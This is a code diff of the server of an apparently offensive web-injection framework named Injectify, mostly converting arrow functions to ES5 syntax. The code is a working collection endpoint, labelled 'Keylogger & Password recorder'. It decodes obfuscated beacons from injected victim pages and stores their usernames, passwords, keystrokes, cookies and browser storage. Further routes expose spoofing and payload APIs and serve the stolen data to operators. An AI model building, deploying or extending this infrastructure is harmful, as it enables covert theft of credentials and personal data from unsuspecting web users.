                     socket.emit('err', {
@@ -1226,17 +1228,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('project:close', data => {
+        socket.on('project:close', function (data) {
             state.project = '';
             state.page = '';
             clearTimeout(state.refresh);
             unwatch('client');
         });
-        socket.on('inject:close', data => {
+        socket.on('inject:close', function (data) {
             unwatch('inject');
             unwatch('client');
         });
-        socket.on('disconnect', data => {
+        socket.on('disconnect', function (data) {
             unwatch('inject');
             unwatch('client');
             state = {};
@@ -1253,9 +1255,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
     /**
      * Inject authorisation API
      */
-    app.get('/a', injectLimiter, (req, res) => {
-        let generateToken = req => {
-            let ip;
+    app.get('/a', injectLimiter, function (req, res) {
+        var generateToken = function (req) {
+            var ip;
             try {
                 ip = req.headers['x-forwarded-for'].split(',')[0];
             }
@@ -1267,15 +1269,15 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 id: +new Date()
             }));
         };
-        let authenticate = (req, res, token) => {
-            let { id } = req.query;
+        var authenticate = function (req, res, token) {
+            var id = req.query.id;
             try {
-                let { ip } = JSON.parse(atob(token));
+                var ip = JSON.parse(atob(token)).ip;
                 if (ip) {
                     /**
                      * Correctly parsed token
                      */
-                    let realIP;
+                    var realIP = void 0;
                     try {
                         realIP = req.headers['x-forwarded-for'].split(',')[0];
                     }
@@ -1330,7 +1332,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         /**
                          * Generate a new token
                          */
-                        let token = generateToken(req);
+                        var token = generateToken(req);
                         res.cookie('token', token);
                         authenticate(req, res, token);
                     }
@@ -1355,8 +1357,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
     /**
      * Keylogger & Password recorder
      */
-    app.get('/r/*', (req, res) => {
-        let headers = req.headers;
+    app.get('/r/*', function (req, res) {
+        var headers = req.headers;
         if (req.headers['forwarded-headers']) {
             // Attempt to extract forwarded headers
             try {
@@ -1375,11 +1377,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 // Failed to parse JSON from forwarded headers => likely malicious
             }
         }
-        let validate = base64 => {
-            return new Promise((resolve, reject) => {
+        var validate = function (base64) {
+            return new Promise(function (resolve, reject) {
                 if (typeof base64 === 'string') {
                     try {
-                        let json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()));
+                        var json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()));
                         if (json)
                             resolve(json);
                     }
@@ -1392,35 +1394,35 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 }
             });
         };
-        let Record = record => {
-            return new Promise((resolve, reject) => {
-                let project = 'a';
-                let type = 't';
-                let username = 'b';
-                let identifier = 'b';
-                let password = 'c';
-                let keys = 'c';
-                let url = 'd';
-                let width = 'e';
-                let height = 'f';
-                let localStorage = 'g';
-                let sessionStorage = 'h';
-                let cookies = 'i';
-                let title = 'j';
+        var Record = function (record) {
+            return new Promise(function (resolve, reject) {
+                var project = 'a';
+                var type = 't';
+                var username = 'b';
+                var identifier = 'b';
+                var password = 'c';
+                var keys = 'c';
+                var url = 'd';
+                var width = 'e';
+                var height = 'f';
+                var localStorage = 'g';
+                var sessionStorage = 'h';
+                var cookies = 'i';
+                var title = 'j';
                 if (record[project]) {
-                    db.collection('projects', (err, projects) => {
+                    db.collection('projects', function (err, projects) {
                         if (err)
                             throw err;
                         projects.findOne({
                             name: record[project]
-                        }).then(doc => {
+                        }).then(function (doc) {
                             if (doc !== null) {
                                 if (req.header('Referer') && doc.config.filter.domains.length > 0) {
-                                    let referer = new URL(req.header('Referer'));
-                                    let allowed = true;
+                                    var referer_1 = new URL(req.header('Referer'));
+                                    var allowed_1 = true;
                                     if (doc.config.filter.type.toLowerCase() === 'whitelist')
-                                        allowed = false;
-                                    doc.config.filter.domains.forEach(domain => {
+                                        allowed_1 = false;
+                                    doc.config.filter.domains.forEach(function (domain) {
                                         if (domain.enabled === false)
                                             return;
                                         try {
@@ -1431,16 +1433,16 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         }
                                         if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                                             // Whitelist
-                                            if (domain.host === referer.host)
-                                                allowed = true;
+                                            if (domain.host === referer_1.host)
+                                                allowed_1 = true;
                                         }
                                         else {
                                             // Blacklist
-                                            if (domain.host === referer.host)
-                                                allowed = false;
+                                            if (domain.host === referer_1.host)
+                                                allowed_1 = false;
                                         }
                                     });
-                                    if (!allowed) {
+                                    if (!allowed_1) {
                                         if (doc.config.filter.type.toLowerCase() === 'whitelist') {
                                             reject("domain hasn't been whitelisted, not recording");
                                         }
@@ -1463,7 +1465,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                     headers: {
                                         'Accept': 'application/json'
                                     }
-                                }, (error, response, parsedIP) => {
+                                }, function (error, response, parsedIP) {
                                     if (error)
                                         throw error;
                                     try {
@@ -1516,7 +1518,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                                     }
                                                 }
                                             }
-                                        }).then(() => {
+                                        }).then(function () {
                                             if (config.debug) {
                                                 console.log(chalk.greenBright('[Record] ') +
                                                     chalk.yellowBright('recorded login ') +
@@ -1531,25 +1533,25 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                     }
                                     else if (record[type] === 1) {
                                         // Keylogger
-                                        let timestamp = new Date();
+                                        var timestamp_1 = new Date();
                                         try {
-                                            timestamp = new Date(record[identifier]);
+                                            timestamp_1 = new Date(record[identifier]);
                                         }
                                         catch (e) { }
                                         // If the length is greater than 10,
                                         if (record[keys]) {
-                                            let keystrokes = [];
+                                            var keystrokes_1 = [];
                                             try {
                                                 for (i = 0; i < record[keys].length; i++) {
-                                                    let key = record[keys][i];
-                                                    let keytype = 'keydown';
-                                                    if (key.endsWith('_') && key.length !== 1) {
-                                                        key = key.slice(0, -1);
+                                                    var key_1 = record[keys][i];
+                                                    var keytype = 'keydown';
+                                                    if (key_1.endsWith('_') && key_1.length !== 1) {
+                                                        key_1 = key_1.slice(0, -1);
                                                         keytype = 'keyup';
                                                     }
-                                                    let keyname = key;
+                                                    var keyname = key_1;
                                                     if (keyname && keytype) {
-                                                        keystrokes.push('[' + keytype + ' ' + keyname + ']');
+                                                        keystrokes_1.push('[' + keytype + ' ' + keyname + ']');
                                                     }
                                                     else {
                                                         reject('invalid keylogger keycode');
@@ -1563,12 +1565,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                             }
                                             projects.updateOne({
                                                 'name': record[project],
-                                                'keylogger.timestamp': timestamp
+                                                'keylogger.timestamp': timestamp_1
                                             }, {
                                                 $pushAll: {
-                                                    'keylogger.$.keys': keystrokes
+                                                    'keylogger.$.keys': keystrokes_1
                                                 }
-                                            }).then((e) => {
+                                            }).then(function (e) {
                                                 if (e.result.nModified === 0) {
                                                     // Add new keylogger record
                                                     projects.updateOne({
@@ -1576,7 +1578,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                                     }, {
                                                         $push: {
                                                             keylogger: {
-                                                                timestamp: timestamp,
+                                                                timestamp: timestamp_1,
                                                                 ip: ip,
                                                                 url: {
                                                                     title: record[title],
@@ -1586,10 +1588,10 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                                                     headers: me(headers),
                                                                     'user-agent': parseAgent(headers['user-agent'])
                                                                 },
-                                                                keys: keystrokes
+                                                                keys: keystrokes_1
                                                             }
                                                         }
-                                                    }).then(() => {
+                                                    }).then(function () {
                                                         resolve('wrote record to database');
                                                     });
                                                 }
@@ -1615,7 +1617,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 }
             });
         };
-        let path;
+        var path;
         if (req.path.slice(-1) === '$') {
             // CORS bypass option enabled
             path = req.path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1);
@@ -1625,7 +1627,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
         else {
             path = req.path.substring(1).split(/\/(.+)?/, 2)[1];
             // Send a 1x1px gif
-            let data = [
+            var data = [
                 0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
                 0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x04, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00,
                 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b
@@ -1636,19 +1638,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 .status(200)
                 .send(Buffer.from(data));
         }
-        validate(path).then(record => {
-            Record(record).then(message => {
+        validate(path).then(function (record) {
+            Record(record).then(function (message) {
                 if (config.debug) {
                     console.log(chalk.greenBright('[record] ') +
                         chalk.yellowBright(message));
                 }
-            }).catch(error => {
+            })["catch"](function (error) {
                 if (config.debug) {
                     console.log(chalk.redBright('[record] ') +
                         chalk.yellowBright(error));
                 }
             });
-        }).catch(error => {
+        })["catch"](function (error) {
             if (config.debug)
                 console.log(chalk.redBright('[record] ') + chalk.yellowBright(error));
         });
@@ -1656,193 +1658,31 @@ MongoClient.connect(config.mongodb, (err, client) => {
     /**
      * Spoof API
      */
-    app.get('/api/spoof/*', apiLimiter, (req, res) => api.spoof(req, res));
+    app.get('/api/spoof/*', apiLimiter, function (req, res) { return api.spoof(req, res); });
     /**
      * Payload API
      */
-    app.get('/api/payload/*', apiLimiter, (req, res) => api.payload(req, res));
+    app.get('/api/payload/*', apiLimiter, function (req, res) { return api.payload(req, res); });
     /**
      * Project API
      */
-    app.get('/api/*', apiLimiter, (req, res) => {
-        var getAPI = (name, token, type) => {
-            return new Promise((resolve, reject) => {
-                request({
-                    url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json',
-                        'User-Agent': 'Injectify'
-                    }
-                }, (error, response, user) => {
-                    try {
-                        user = JSON.parse(user);
-                    }
-                    catch (e) {
-                        console.error(e);
-                        reject({
-                            title: 'Could not authenticate you',
-                            message: 'Failed to parse the GitHub user API response'
-                        });
-                    }
-                    if (!error && response.statusCode === 200 && user.login) {
-                        db.collection('projects', (err, projects) => {
-                            if (err)
-                                throw err;
-                            if (config.superusers.includes(user.id)) {
-                                projects.findOne({
-                                    'name': name
-                                }).then(doc => {
-                                    if (doc !== null) {
-                                        resolve({
-                                            json: doc,
-                                            user: user
-                                        });
-                                    }
-                                    else {
-                                        reject({
-                                            title: 'Access denied',
-                                            message: 'Project ' + name + " doesn't exist!"
-                                        });
-                                    }
-                                });
-                            }
-                            else {
-                                projects.findOne({
-                                    $or: [{
-                                            'permissions.owners': user.id
-                                        },
-                                        {
-                                            'permissions.admins': user.id
-                                        },
-                                        {
-                                            'permissions.readonly': user.id
-                                        }
-                                    ],
-                                    $and: [{
-                                            'name': name
-                                        }]
-                                }).then(doc => {
-                                    if (doc !== null) {
-                                        resolve({
-                                            json: doc,
-                                            user: user
-                                        });
-                                    }
-                                    else {
-                                        reject({
-                                            title: 'Access denied',
-                                            message: "You don't have permission to access project " + name
-                                        });
-                                    }
-                                });
-                            }
-                        });
-                    }
-                    else {
-                        reject({
-                            title: 'Could not authenticate you',
-                            message: 'GitHub API rejected token!'
-                        });
-                    }
-                });
-            });
-        };
-        let token = req.query.token;
-        let project = decodeURIComponent(req.path.split('/')[3]);
-        let type = req.path.split('/')[2];
-        if (project && token && (type === 'keylogger' || type === 'passwords' || type === 'inject')) {
-            getAPI(project, token, type).then(data => {
-                let json = data.json;
-                let user = data.user;
-                let stringified;
-                res.setHeader('Content-Disposition', 'filename="Injectify_API_' + json.name + '.json"');
-                if (typeof req.query.download === 'string') {
-                    res.setHeader('Content-Type', 'application/octet-stream');
-                }
-                else {
-                    res.setHeader('Content-Type', 'application/json');
-                }
-                if (type === 'inject') {
-                    if (inject.clients[json._id]) {
-                        stringified = JSON.stringify({
-                            inject: json.inject,
-                            clients: inject.clients[json._id]
-                        }, null, '    ');
-                        res.send(stringified);
-                    }
-                    else {
-                        stringified = JSON.stringify([], null, '    ');
-                        res.status(206).send(stringified);
-                    }
-                }
-                else if (json.passwords && json.keylogger) {
-                    if (type === 'keylogger') {
-                        json = json.keylogger;
-                    }
-                    else {
-                        json = json.passwords;
-                    }
-                    stringified = JSON.stringify(json, null, '    ');
-                    if (!json || !json.length) {
-                        res.status(206).send(stringified);
-                    }
-                    else {
-                        res.send(stringified);
-                    }
-                }
-                else {
-                    res.status(500).send(JSON.stringify({
-                        title: 'Database error',
-                        message: 'An internal error occured whilst handling your request'
-                    }, null, '    '));
-                    return;
-                }
-                console.log(chalk.greenBright('[API/JSON] ') +
-                    chalk.yellowBright('delivered ') +
-                    chalk.magentaBright(project) +
-                    chalk.redBright(' (length=' + stringified.length + ') ') +
-                    chalk.yellowBright('to ') +
-                    chalk.magentaBright(user.login) +
-                    chalk.redBright(' (' + user.id + ') '));
-            }).catch(error => {
-                res.setHeader('Content-Type', 'application/json');
-                res.status(403).send(JSON.stringify(error, null, '    '));
-            });
-        }
-        else if (token) {
-            res.setHeader('Content-Type', 'application/json');
-            res.status(400).send(JSON.stringify({
-                title: 'Bad request',
-                message: 'Specify the project name to return in request',
-                format: '/api/TYPE/PROJECT_NAME?token=' + token
-            }, null, '    '));
-        }
-        else {
-            res.setHeader('Content-Type', 'application/json');
-            res.status(400).send(JSON.stringify({
-                title: 'Bad request',
-                message: 'Specify the type, project name & token to return in request',
-                format: '/api/TYPE/PROJECT_NAME?token=GITHUB_TOKEN'
-            }, null, '    '));
-        }
-    });
+    app.get('/api/*', apiLimiter, function (req, res) { return api.json(req, res); });
     if (config.dev) {
         // Proxy through to webpack-dev-server if in development mode
-        app.use('/projects/*', (req, res) => {
+        app.use('/projects/*', function (req, res) {
             if (req.originalUrl.includes('.hot-update.js')) {
-                let hotUpdate = req.originalUrl.split('/');
+                var hotUpdate = req.originalUrl.split('/');
                 hotUpdate = hotUpdate[hotUpdate.length - 1];
                 request('http://localhost:8080/' + hotUpdate).pipe(res);
                 return;
             }
             if (req.originalUrl.includes('/vs/')) {
-                let vs = req.originalUrl.split('/vs/');
+                var vs = req.originalUrl.split('/vs/');
                 vs = vs[vs.length - 1];
                 request('http://localhost:8080/vs/' + vs).pipe(res);
                 return;
             }
-            request('http://localhost:8080' + req.originalUrl.substring(9), (error, response) => {
+            request('http://localhost:8080' + req.originalUrl.substring(9), function (error, response) {
                 if (error)
                     throw error;
                 if (response.statusCode === 404) {
@@ -1853,7 +1693,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 }
             });
         });
-        app.use('/*', (req, res) => {
+        app.use('/*', function (req, res) {
             if (req.url.substr(0, 9) === '/cdn-cgi/')
                 return;
             if (req.originalUrl === '/config')
@@ -1862,9 +1702,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
         });
     }
     else {
-        app.use('/projects/*', (req, res) => {
+        app.use('/projects/*', function (req, res) {
             if (req.originalUrl.includes('/vs/')) {
-                let vs = req.originalUrl.split('/vs/');
+                var vs = req.originalUrl.split('/vs/');
                 vs = 'interface/vs/' + path.normalize(vs[vs.length - 1]);
                 if (fs.existsSync(vs)) {
                     res.sendFile(path.join(__dirname, vs));
@@ -1877,7 +1717,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 res.sendFile(path.join(__dirname, 'interface/index.html'));
             }
         });
-        app.use('/config', (req, res) => {
+        app.use('/config', function (req, res) {
             res.sendFile(path.join(__dirname, 'interface/index.html'));
         });
         app.use(express.static(path.join(__dirname, 'interface')));
